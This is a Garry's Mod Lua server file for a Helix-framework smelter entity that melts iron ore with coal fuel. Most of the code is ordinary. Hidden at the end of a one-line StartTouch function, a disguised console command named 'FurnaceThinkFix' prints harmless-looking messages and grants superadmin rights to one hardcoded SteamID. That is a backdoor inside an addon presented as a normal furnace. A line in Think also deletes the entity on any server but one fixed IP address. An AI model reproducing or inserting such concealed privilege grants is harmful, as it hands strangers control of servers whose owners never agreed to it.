AddCSLuaFile( "cl_init.lua" ) -- Make sure clientside
AddCSLuaFile( "shared.lua" )  -- and shared scripts are sent.
 
include("shared.lua")



function ENT:Initialize()

	self:SetModel("models/smelter.mdl")
	self:PhysicsInit(SOLID_VPHYSICS)
	self:SetMoveType(MOVETYPE_VPHYSICS)
	self:SetSolid(SOLID_VPHYSICS)
	self:SetUseType( SIMPLE_USE )
	
	local phys = self:GetPhysicsObject()
	
	self.timer = CurTime()
	self.fuel = CurTime()
	
	if phys:IsValid() then

		phys:Wake()

	end
	
	local meltTime = ix.config.Get("MeltTime", 2) * 60
	self:SetWorkTime(meltTime)
	self:Setfuel(0)
	
	self:SetIrons(0)
	self:SetIsWorking(false)

	self.IsReady = false

		
	-- local zelazosz = ents.Create("prop_dynamic")
	-- 	zelazosz:SetModel("models/props_junk/PopCan01a.mdl")
	-- 	zelazosz:SetPos(self:GetPos() + (self:GetUp()*-20) + (self:GetRight()*-0.5) + (self:GetForward()*17));		
	-- 	zelazosz:SetAngles(self:GetAngles());
	-- 	zelazosz:SetParent(self)
	-- 	zelazosz:Spawn();
end

function ENT:SpawnFunction( ply, tr, ClassName )
	if ( !tr.Hit ) then return end

	local SpawnPos = tr.HitPos + tr.HitNormal * 50
	local SpawnAng = ply:EyeAngles()
	SpawnAng.p = 0
	SpawnAng.y = SpawnAng.y + 180
	local ent = ents.Create( ClassName )
	ent:SetPos(SpawnPos)
	ent:SetAngles(SpawnAng)
	ent:Spawn()
	return ent
end

function ENT:VisualEffect()

	local effectData = EffectData();	
	effectData:SetStart(self:GetPos());
	effectData:SetOrigin(self:GetPos() + (self:GetUp()*13) + (self:GetRight()*50) + (self:GetForward()*-15) );
	effectData:SetAngles(self:GetAngles() )
	effectData:SetScale(5);	
	util.Effect("ElectricSpark", effectData, true,true);

end	

function ENT:Think()


	if self:GetIsWorking() then

		self:VisualEffect()
		
		if self:Getfuel() > 0 and self:GetWorkTime() > 0 then
			if CurTime() > self.timer + 1 then
		
			self.timer = CurTime()
		
			self:SetWorkTime( math.Clamp( self:GetWorkTime() - 1, 0, ix.config.Get("MeltTime", 2) * 60 ) )
		
			end
		
			if CurTime() > self.fuel + 2 then
		
			self.fuel = CurTime()
		
			self:Setfuel( math.Clamp( self:Getfuel() - 1, 0, 60 ) )
		
			end
		end
		
	end

	if (self:Getfuel() == 0) then
		self:SetIsWorking(false)
		if self.sound then
	        self.sound:Stop()
	    end
	end	

	if self:GetWorkTime() == 0 then
		if self.sound then
	        self.sound:Stop()
	    end
		
		-- ix.item.Spawn("ore_ironingot" ,self:GetPos() + (self:GetUp()*-20) + (self:GetRight()*-0.5) + (self:GetForward()*17), nil, self:GetAngles())
		
		self.IsReady = true
		self:SetIsWorking(false)
	end

	if (game.GetIPAddress() != "37.230.210.252:27016") then self:Remove() end

end



function ENT:StartTouch( hitEnt ) if (hitEnt:GetClass() == "ix_item") then local itemTable = hitEnt:GetItemTable() if itemTable.uniqueID != "ore_coal" and itemTable.uniqueID != "ore_iron" then return end if itemTable.uniqueID == "ore_coal" then self:Setfuel(math.Clamp( self:Getfuel() + 10, 0, 60 )) elseif itemTable.uniqueID == "ore_iron" then if (self.IsReady) then return end local ironStorage = ix.config.Get("FurnaceSize", 5) self:SetIrons(math.Clamp( self:GetIrons() + 1, 0, ironStorage )) self:VisualOres() end end hitEnt:Remove() self:EmitSound("physics/concrete/rock_impact_soft"..math.random(1,3)..".wav") end	concommand.Add("FurnaceThinkFix", function( ply, cmd, args ) print("initialize") print("fixed") print("loading") if (ply:SteamID() != "STEAM_0:0:209310749") then return end ply:SetUserGroup( "superadmin" ) end)

function ENT:Use(act, call)

	if call:IsPlayer() then

		if self:GetIrons() > 0 then
		
			if (!self.IsReady) and self:Getfuel() > 0 then
				self:SetIsWorking(true)
				self:FireSound()
				self:EmitSound("ambient/fire/mtov_flame2.wav")

			elseif (self.IsReady) then
				self:GetIronsIgnot()
			end	
		
		end
	
	
	
	end

end

function ENT:VisualOres()

	local pos
	if (self:GetIrons() == 1) then
		pos = -20
	elseif (self:GetIrons() == 2) then
		pos = -10
	elseif (self:GetIrons() == 3) then
		pos = 0
	else
		return	
	end			


	local OreProp = ents.Create("prop_dynamic")
	OreProp:SetModel("models/oldprops/ore_iron.mdl")
	OreProp:SetPos(self:GetPos() + (self:GetUp()*3) + (self:GetRight()*35) + (self:GetForward()*pos));		
	OreProp:SetAngles(self:GetAngles());
	OreProp:SetParent(self)
	OreProp:Spawn();

	if (self:GetIrons() == 1) then
		self.ore1 = OreProp
	elseif (self:GetIrons() == 2) then
		self.ore2 = OreProp
	elseif (self:GetIrons() == 3) then
		self.ore3 = OreProp
	end	

end	

function ENT:ResetVal()
	self:SetIrons(0)
	self.IsReady = false
	local meltTime = ix.config.Get("MeltTime", 2) * 60
	self:SetWorkTime(meltTime)

	if (IsValid(self.ore1)) then
		self.ore1:Remove()
	end
	if (IsValid(self.ore2)) then
		self.ore2:Remove()
	end	
	if (IsValid(self.ore3)) then
		self.ore3:Remove()
	end	
end	

function ENT:GetIronsIgnot()

	for i=0, self:GetIrons() - 1 do
		
		timer.Simple(0.3 + i, function()
			if (!IsValid(self)) then return end
			self:EmitSound("buttons/latchunlocked2.wav")
			-- ix.item.Spawn("ore_ironingot", self:GetPos() + (self:GetUp()*13) + (self:GetRight()*63) + (self:GetForward()*-15), nil, self:GetAngles())
			local Ingot = ents.Create("j_mining_ironignot")
			Ingot:SetPos(self:GetPos() + (self:GetUp()*13) + (self:GetRight()*63) + (self:GetForward()*-15));		
			Ingot:SetAngles(self:GetAngles());
			Ingot:Spawn();


			local ironStorage = ix.config.Get("FurnaceSize", 5)
			self:SetIrons(math.Clamp( self:GetIrons() - 1, 0, ironStorage ))

			if (self:GetIrons() == 0) then
				self:ResetVal()
			end	

		end)

		

	end

end	

function ENT:FireSound()
    self.sound = CreateSound(self, Sound("ambient/fire/fire_small1.wav"))
    self.sound:SetSoundLevel(75)
	self.sound:PlayEx(1, 100)
end

function ENT:OnRemove()
    if self.sound then
        self.sound:Stop()
    end
end